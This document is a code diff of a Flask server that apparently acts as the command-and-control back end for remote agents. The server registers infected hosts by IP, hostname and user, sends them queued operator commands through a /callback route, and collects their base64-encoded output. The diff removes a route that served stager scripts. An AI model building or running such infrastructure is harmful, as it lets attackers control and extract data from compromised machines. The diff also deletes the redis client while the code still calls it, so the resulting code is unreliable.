@@ -1,18 +1,9 @@
-from flask import Flask, request, Response, jsonify, send_from_directory
-import redis
+from flask import Flask, request
 from functions import *
-import os
 import base64
 
-# db_path = "/app/data/agents.db" # Docker volume DB path
-
-r = redis.Redis(host=os.getenv('REDIS_HOST'), port=6379, db=0, decode_responses=True)
 
 app = Flask(__name__)
-
-@app.route('/files/<string:script>', methods=['GET'])
-def stager(script):
-    return send_from_directory('scripts', script, as_attachment=False)
 
 @app.route('/admin', methods=['POST'])
 def send_command():
@@ -25,32 +16,46 @@ def send_command():
             r.lpop(uuid)
     return "Command Sent!"
 
-@app.route('/login', methods=['GET', 'POST'])
+@app.route('/callback', methods=['GET', 'POST'])
 def commander():
-    b64 = base64.b64decode(request.args.get("uuid"))
-    uuid = b64.decode('utf-8')
     if request.method == 'GET':
-        raw_profile = request.headers.get("User-Agent").split("/", 3)
-        profile = raw_profile[0]
-        hostname = raw_profile[2]
-        # ip = request.headers.get("X-Real-IP")
-        ip = request.remote_addr
-        cache = r.lindex(uuid, -1)
-        if r.exists(uuid) == 0:
-            command = register_agent(uuid, profile, ip, hostname)
+        b64uuid = base64.b64decode(request.args.get("uuid"))
+        b64user = base64.b64decode(request.args.get("user"))
 
-        elif "SEEN" in cache or "AGENT REGISTERED" in cache:
+        uuid = b64uuid.decode('utf-8')
+        profile = request.headers.get("Sec-Purpose")
+        hostname = request.headers.get("X-Forwarded-Host")
+        ip = request.headers.get("X-Real-IP")
+        user = b64user.decode('utf-8')
+
+        if r.exists(uuid) == 0:
+            register_agent(uuid, profile, ip, hostname, user)
+            send = {"data": "", "param": ""}
+            return send
+
+        cache = r.lindex(uuid, -1)
+        if "SEEN" in cache or "AGENT REGISTERED" in cache:
             update_seen(uuid)
-            command = ""
+            send = send = {"data": "", "param": ""}
         else:
+            cmd = cache.split(' ', 1)
+            if len(cmd) > 1:
+                param = cmd[1]
+            else:
+                param = ""
             update_seen(uuid)
-            command = cache
             r.rpush(uuid, "SEEN")
             small_check(uuid)
-        return command
+            send = {"data": cmd[0], "param": param}
+        return send
 
     elif request.method == 'POST':
-        data = request.data
+        data = request.json
+        b64data = base64.b64decode(data.get("data"))
+        b64uuid = base64.b64decode(data.get("uuid"))
+
+        uuid = b64uuid.decode('utf-8')
+        data = b64data.decode('utf-8')
         if uuid and data:
             key = f"{uuid}-output"
             r.publish(key, data)
